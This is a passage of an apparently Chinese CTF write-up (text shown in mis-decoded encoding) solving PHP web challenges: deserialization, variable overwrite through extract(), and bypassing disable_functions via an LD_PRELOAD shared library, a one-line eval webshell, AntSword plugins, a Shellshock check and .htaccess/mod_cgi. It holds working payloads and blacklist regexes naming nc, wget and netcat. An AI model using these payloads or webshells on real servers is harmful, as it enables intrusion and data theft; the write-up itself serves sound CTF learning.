class="hljs-variable">$correct</span> = <span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-keyword">$this</span>-&gt;correct = base64_encode(uniqid());<br>           <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;correct === <span class="hljs-keyword">$this</span>-&gt;input) &#123;<br>               <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/flag&quot;</span>);<br>           &#125;<br>       &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>       &#125;<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pleaseget&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pleasepost&#x27;</span>] === <span class="hljs-string">&#x27;2&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md51&#x27;</span>]) == md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md52&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md51&#x27;</span>] != <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md52&#x27;</span>]) &#123;<br>            unserialize(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;obj&#x27;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæœ‰unserializeå‚æ•°é€šè¿‡POSTå˜é‡objï¼Œå³å‚æ•°å¯æ§ï¼Œå…¶æ¬¡ç±»å·²ç»ç»™å‡ºï¼Œå¯ä»¥åˆ©ç”¨ï¼Œæœ€åï¼Œç±»ä¸­æœ‰é­”æœ¯æ–¹æ³•__destruct è¯´æ˜è¿™æ˜¯ä¸€é“è€ƒæŸ¥äº†ååºåˆ—åŒ–çŸ¥è¯†ç‚¹çš„é¢˜</p><p>é¢˜ä¸­å‡½æ•°è®²è§£ï¼šuniqid()ï¼šåŸºäºä»¥å¾®ç§’è®¡çš„å½“å‰æ—¶é—´ï¼Œç”Ÿæˆä¸€ä¸ªå”¯ä¸€id</p><p>MD5çš„==æ¯”è¾ƒï¼Œå¯ä»¥ä½¿ç”¨å“ˆå¸Œæ¯”è¾ƒç¼ºé™·å’Œæ•°ç»„ç»•è¿‡</p><p>æ¡ä»¶$this-&gt;correct === $this-&gt;inputæ„é€ ä¼ å¼•ç”¨ï¼š</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$a</span>-&gt;<span class="hljs-variable">$input</span>=<span class="hljs-variable">$a</span>-&gt;<span class="hljs-variable">$correct</span>;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BUU</span> </span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$correct</span> = <span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-keyword">$this</span>-&gt;correct = base64_encode(uniqid());<br>           <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;correct === <span class="hljs-keyword">$this</span>-&gt;input) &#123;<br>              <span class="hljs-comment">//echo file_get_contents(&quot;/flag&quot;);</span><br>           &#125;<br>       &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>       &#125;<br>   &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> BUU();<br><span class="hljs-variable">$a</span>-&gt;input=&amp;a-&gt;correct;<span class="hljs-comment">//ä¼ å¼•ç”¨</span><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//å¾—åˆ°ï¼šO:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;s:0:&quot;&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>æ‹¼æ¥payloadå³å¯</p><h2 id="abcd"><a href="#abcd" class="headerlink" title="abcd"></a>abcd</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">//$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ygnn_bpkn&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ygnn_bpkn.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|show_source|GLOBALS|echo|var_dump|print|highlight_file|GET|eval/i&quot;</span>, <span class="hljs-variable">$c</span>)&amp;&amp;<span class="hljs-variable">$c</span>&lt;=<span class="hljs-number">16</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);<br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;lueluelue&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>éé¢„æœŸè§£ï¼š</p><blockquote><p>ygnn_bpkn=1&amp;ygnn[bpkn.COM=2&amp;fun=system($_POST[a])&amp;a=tac flag.php</p><p>ygnn_bpkn=1&amp;ygnn[bpkn.COM=2&amp;fun=system($_POST[a])&amp;a=tac flag2.php</p></blockquote></blockquote><p>é¢˜ç›®æœ¬æ„æ˜¯<code>fl0g=flag_give_me</code>è¾“å‡ºflagï¼Œå¾ˆæ˜¾ç„¶<code>fl0g</code>ä¼ å…¥çš„æ–¹å¼æ˜¯GETï¼Œä½†æ˜¯è¦æƒ³è¿™æ ·èµ‹å€¼å‰çš„ifæ¡ä»¶åˆæ˜¯é€šè¿‡GETä¼ å…¥ç©ºå€¼<code>fl0g</code> æ€»ä¹‹è¿™å°±æ˜¯ä¸ªæ­»å±€</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å˜é‡è¦†ç›–çš„æ–¹å¼ï¼Œä¹Ÿæ˜¯è¿™é¢˜çš„è€ƒæŸ¥ç‚¹ï¼Œåˆ©ç”¨å˜é‡cå’Œextract()åšè·³æ¿ï¼Œç»™<code>fl0g</code>ç±»ä¼¼å‚æ•°é€ƒé€¸çš„æ–¹å¼èµ‹å€¼</p><blockquote><p>extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚</p><p>è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ã€‚é’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ã€‚</p><p>è¯¥å‡½æ•°è¿”å›æˆåŠŸè®¾ç½®çš„å˜é‡æ•°ç›®ã€‚</p><p>extract(<strong>array</strong>,extract_rules,prefix)</p></blockquote><blockquote><p>ygnn_bpkn=1&amp;ygnn[bpkn.COM=2&amp;fl0g=flag_give_me&amp;fun=extract($_POST)</p></blockquote><p>ç„¶åè®¿é—®robots.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag2.php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$F</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;F&#x27;</span>])&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/system|nl|tac|tee|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="hljs-variable">$F</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(substr(<span class="hljs-variable">$F</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>));<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;come&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åº”æ˜¯ç¯å¢ƒé—®é¢˜ï¼Œè§£æ³•åº”è¯¥æ˜¯curl -Fï¼Œæ­¤å¤„<code>?F=\`$F `;vi flag2.php</code>æ²¡æœ‰å“åº” å°è¯•äº†å…¶ä»–å‘½ä»¤ä¹Ÿæ˜¯å¦‚æ­¤</p><p>è‡³æ­¤æ­¤é¢˜è§£</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯<code>$a=$_SERVER[&#39;argv&#39;];</code>è¢«æ³¨é‡Šäº†ï¼Œå¦åˆ™å­˜åœ¨è§£æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>]å½“å‰ä¼ é€’ç»™PHPç¨‹åºçš„å‚æ•°<br><span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>][<span class="hljs-number">0</span>];<br>å½“æˆ‘ä»¬ä¼ å€¼ ?<span class="hljs-variable">$fl0g</span>=flag_give_me; (ä¸€å®šè¦åŠ ä¸Šåˆ†å·ï¼›)ç„¶åæ­¤æ—¶<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;<span class="hljs-subst">$fl0g</span>=flag_give_me;&quot;</span>å¹¶ä¸æ˜¯ç›´æ¥GET fl0gï¼Œ<br>åœ¨ä½¿ç”¨<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>])ï¼Œæ¥æ‰§è¡Œ<span class="hljs-string">&quot;<span class="hljs-subst">$fl0g</span>=flag_give_me;&quot;</span>ï¼Œè¾¾åˆ°èµ‹å€¼çš„ç›®çš„<br>æœ€å <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>)<br><br>GET: ?<span class="hljs-variable">$fl0g</span>=flag_give_me;<br>POST: ygnn_bpkn=<span class="hljs-number">1</span>&amp;ygnn[bpkn.COM=<span class="hljs-number">2</span>&amp;fun=<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>])<br></code></pre></td></tr></table></figure><h2 id="def"><a href="#def" class="headerlink" title="def"></a>def</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>];<br><span class="hljs-keyword">if</span>(!preg_match_all(<span class="hljs-string">&#x27;/eval|system|usort|array|include|shell_exec|exec|call|function|replace|uasort/i&#x27;</span>,<span class="hljs-variable">$a</span>))<br>&#123;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[a-zA-Z]/&#x27;</span>,<span class="hljs-variable">$b</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ä¸è¦å­—æ¯&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$f</span> = <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[a-zA-Z]/&#x27;</span>,<span class="hljs-variable">$d</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;éƒ½è¯´äº†ä¸è¦å­—æ¯&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>];<br>        <span class="hljs-variable">$g</span> = <span class="hljs-variable">$f</span>(<span class="hljs-variable">$e</span>(<span class="hljs-variable">$d</span>));<br>        <span class="hljs-variable">$caicai</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;caicai&#x27;</span>];<br>        <span class="hljs-variable">$cc</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cc&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/abc|def|caicai|cc/&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;h&#x27;</span>]))<br>        &#123;<br>            <span class="hljs-variable">$h</span> = <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;h&#x27;</span>].<span class="hljs-string">&#x27;;&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ä¸è¦ä½¿ç”¨æ•æ„Ÿå‡½æ•°&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>base_convert(<strong>number,frombase,tobase</strong>);åœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—</p></blockquote><p>å…ˆè¯´éé¢„æœŸè§£ï¼šæ‰«ç›®å½•å‘ç°<code>.DS_Store</code>ï¼Œå·¥å…·è§£å¼€å‘ç°<code>flagaaaaaaaaaa.txt</code>ï¼Œè®¿é—®å³å¯</p><h2 id="Bypass-disable-function-â€”â€”-LD-PRELOAD"><a href="#Bypass-disable-function-â€”â€”-LD-PRELOAD" class="headerlink" title="Bypass disable_function â€”â€” LD_PRELOAD"></a>Bypass disable_function â€”â€” LD_PRELOAD</h2><p>LD_PRELOADæ˜¯Linuxç³»ç»Ÿçš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå®ƒå¯ä»¥å½±å“ç¨‹åºçš„è¿è¡Œæ—¶çš„é“¾æ¥ï¼ˆRuntime linkerï¼‰ï¼Œå®ƒå…è®¸ä½ å®šä¹‰åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ã€‚è¿™ä¸ªåŠŸèƒ½ä¸»è¦å°±æ˜¯ç”¨æ¥æœ‰é€‰æ‹©æ€§çš„è½½å…¥ä¸åŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„ç›¸åŒå‡½æ•°ã€‚é€šè¿‡è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸»ç¨‹åºå’Œå…¶åŠ¨æ€é“¾æ¥åº“çš„ä¸­é—´åŠ è½½åˆ«çš„åŠ¨æ€é“¾æ¥åº“ï¼Œç”šè‡³è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“ã€‚ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥æ­¤åŠŸèƒ½æ¥ä½¿ç”¨è‡ªå·±çš„æˆ–æ˜¯æ›´å¥½çš„å‡½æ•°ï¼ˆæ— éœ€åˆ«äººçš„æºç ï¼‰ï¼Œè€Œå¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»¥å‘åˆ«äººçš„ç¨‹åºæ³¨å…¥ç¨‹åºï¼Œä»è€Œè¾¾åˆ°ç‰¹å®šçš„ç›®çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span>&#123;<br>system(<span class="hljs-string">&quot;cat /flag &gt;&gt; /var/www/html/test.php&quot;</span>);<br>system(<span class="hljs-string">&quot;tac /flag &gt;&gt; /var/www/html/test.php&quot;</span>);<br>system(<span class="hljs-string">&quot;/readflag &gt;&gt; /var/www/html/test.php&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span>  <span class="hljs-title">geteuid</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    payload();<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>gcc -c -fPIC hack.c -o hack<br>gcc -shared hack -o hack.so</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;ant&#x27;</span>]);<br>  putenv(<span class="hljs-string">&quot;LD_PRELOAD=/tmp/hack.so&quot;</span>);<br>  error_log(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-number">1</span>);<br>  mail(<span class="hljs-string">&quot;admin@localhost&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>putenv()ç”¨æ¥æ”¹å˜æˆ–å¢åŠ ç¯å¢ƒå˜é‡çš„å†…å®¹. å‚æ•°string çš„æ ¼å¼ä¸ºnameï¼value, å¦‚æœè¯¥ç¯å¢ƒå˜é‡åŸå…ˆå­˜åœ¨, åˆ™å˜é‡å†…å®¹ä¼šä¾å‚æ•°string æ”¹å˜, å¦åˆ™æ­¤å‚æ•°å†…å®¹ä¼šæˆä¸ºæ–°çš„ç¯å¢ƒå˜é‡.</p></blockquote><p>æµè§ˆå™¨è®¿é—®shell.phpï¼Œå†è®¿é—®test.php,å³å¯å‘ç°flag</p><p>åˆ©ç”¨èšå‰‘æ’ä»¶å¯ä»¥å…å»ä¸Šè¿°è¿‡ç¨‹ å¦‚ä¸‹é¢˜ï¼š</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210729142924840.png"></p><p>èšå‰‘è¿æ¥</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210729143019466.png"></p><p>ç›´æ¥æŸ¥çœ‹flagæ–‡ä»¶ä¸ºç©º ä¸‹è½½æ–‡ä»¶å¾—åˆ°æ²¡æƒé™</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210729143920521.png"></p><p>ç»ˆç«¯å§‹ç»ˆè¿”å›127 è¿™æ˜¯è¿è¡Œç¯å¢ƒå’Œç™»å½•ç”¨æˆ·çš„è¿è¡Œç¯å¢ƒå­˜åœ¨å·®å¼‚é€ æˆçš„ è¿™æ ·è®¾ç½®å°±æ˜¯æƒé™ä¸å¤Ÿ</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210729143100697.png"></p><p>åœ¨èšå‰‘ä½¿ç”¨æ’ä»¶ç»•è¿‡disable_functionï¼ŒæˆåŠŸåå¯ä»¥çœ‹åˆ° <code>/var/www/html/</code> ç›®å½•ä¸‹æ–°å»ºäº†ä¸€ä¸ª <code>.antproxy.php</code> æ–‡ä»¶</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210729154051090.png"></p><p>æ”¹ç”¨.antproxy.phpè¿æ¥èšå‰‘ å³å¯ç»•è¿‡</p><h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><p>ShellShock,ç ´å£³æ¼æ´ï¼Œå‡ºç°äº2014å¹´<br>å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨è¿™ä¸ªæ¼æ´<br><code>env x=&#39;() &#123; :;&#125;; echo vulnerable&#39; bash -c &quot;echo this is a test&quot;</code><br>å¦‚æœå‡ºç°vulnerableè¯´æ˜å­˜åœ¨</p><h2 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h2><p>éœ€è¦ç”¨åˆ°.htaccesså’Œmod_cgi</p><p>1ï¼‰.htaccess</p><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸åº”è¯¥ä½¿ç”¨.htaccessæ–‡ä»¶ï¼Œé™¤éä½ å¯¹ä¸»é…ç½®æ–‡ä»¶æ²¡æœ‰è®¿é—®æƒé™ï¼›.htaccessæ–‡ä»¶åº”è¯¥è¢«ç”¨åœ¨å†…å®¹æä¾›è€…éœ€è¦é’ˆå¯¹ç‰¹å®šç›®å½•æ”¹å˜æœåŠ¡å™¨çš„é…ç½®è€Œåˆæ²¡æœ‰rootæƒé™çš„æƒ…å†µä¸‹ã€‚å¦‚æœæœåŠ¡å™¨ç®¡ç†å‘˜ä¸æ„¿æ„é¢‘ç¹ä¿®æ”¹é…ç½®ï¼Œåˆ™å¯ä»¥å…è®¸ç”¨æˆ·é€šè¿‡.htaccessæ–‡ä»¶è‡ªå·±ä¿®æ”¹é…ç½®ï¼Œå°¤å…¶æ˜¯ISPåœ¨åŒä¸€ä¸ªæœºå™¨ä¸Šè¿è¡Œäº†å¤šä¸ªç”¨æˆ·ç«™ç‚¹ï¼Œè€Œåˆå¸Œæœ›ç”¨æˆ·å¯ä»¥è‡ªå·±æ”¹å˜é…ç½®çš„æƒ…å†µä¸‹ã€‚</p><p>2ï¼‰mod_cgi</p><p>åœ¨éçº¿ç¨‹å‹MPM(<code>prefork</code>)ä¸Šæä¾›å¯¹CGIè„šæœ¬æ‰§è¡Œçš„æ”¯æŒ</p><p>ä»»ä½•å…·æœ‰MIMEç±»å‹<code>application/x-httpd-cgi</code>æˆ–è€…è¢«<code>cgi-script</code>å¤„ç†å™¨å¤„ç†çš„æ–‡ä»¶éƒ½å°†è¢«ä½œä¸ºCGIè„šæœ¬å¯¹å¾…å¹¶ç”±æœåŠ¡å™¨è¿è¡Œï¼Œå®ƒçš„è¾“å‡ºå°†è¢«è¿”å›ç»™å®¢æˆ·ç«¯ã€‚å¯ä»¥é€šè¿‡ä¸¤ç§é€”å¾„ä½¿æ–‡ä»¶æˆä¸ºCGIè„šæœ¬ï¼Œä¸€ç§æ˜¯æ–‡ä»¶å…·æœ‰å·²ç”±<code>AddType</code>æŒ‡ä»¤å®šä¹‰çš„æ‰©å±•åï¼Œå¦ä¸€ç§æ˜¯æ–‡ä»¶ä½äº<code>ScriptAlias</code>ç›®å½•ä¸­ã€‚å¦‚æœ.htaccessæ–‡ä»¶è¢«æ”»å‡»è€…ä¿®æ”¹çš„è¯ï¼Œæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨apacheçš„mod_cgiæ¨¡å—ï¼Œç›´æ¥ç»•è¿‡PHPçš„ä»»ä½•é™åˆ¶ï¼Œæ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><p>éœ€è¦æ»¡è¶³å‡ ä¸ªæ¡ä»¶:</p><p>ç¬¬ä¸€ï¼Œå¿…é¡»æ˜¯apacheç¯å¢ƒ<br>ç¬¬äºŒï¼Œmod_cgiå·²ç»å¯ç”¨<br>ç¬¬ä¸‰ï¼Œå¿…é¡»å…è®¸.htaccessæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨httpd.confä¸­ï¼Œè¦æ³¨æ„AllowOverrideé€‰é¡¹ä¸ºAllï¼Œè€Œä¸æ˜¯none<br>ç¬¬å››ï¼Œå¿…é¡»æœ‰æƒé™å†™.htaccessæ–‡ä»¶</p><p>.htaccesså†…å®¹ï¼š</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 